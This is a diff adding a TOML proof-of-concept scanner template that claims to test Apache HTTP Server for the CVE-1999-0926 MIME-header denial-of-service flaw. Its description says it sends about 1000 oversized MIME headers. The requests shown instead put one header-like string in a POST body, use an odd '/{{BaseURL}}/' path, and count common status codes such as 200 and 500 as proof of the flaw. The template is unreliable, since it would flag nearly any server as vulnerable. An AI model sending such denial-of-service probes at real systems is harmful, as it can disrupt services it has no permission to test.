@@ -1,0 +1,56 @@
+[info]
+author = "ave"
+description = "验证目标 Apache HTTP Server 是否因缺乏 MIME 头部数量上限而存在拒绝服务漏洞。通过发送一个包含大量（约 1000 个）超大 MIME 头部的 HTTP 请求，若目标在请求期间内存占用异常增长或连接被耗尽/超时挂起，则表明存在该漏洞。"
+id = "POC-AVE-1999-1309"
+name = "CVE-1999-0926 Apache MIME Header 拒绝服务 PoC"
+severity = "critical"
+tags = ["ave-1999-1309"]
+vuln_id = [
+    "CVE-1999-0926",
+    "AVE-1999-1309",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    408,
+    500,
+]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+X-Mime-Hdr-0000: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0001AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0002AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0003AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    408,
+    500,
+    503,
+]
+type = "status"
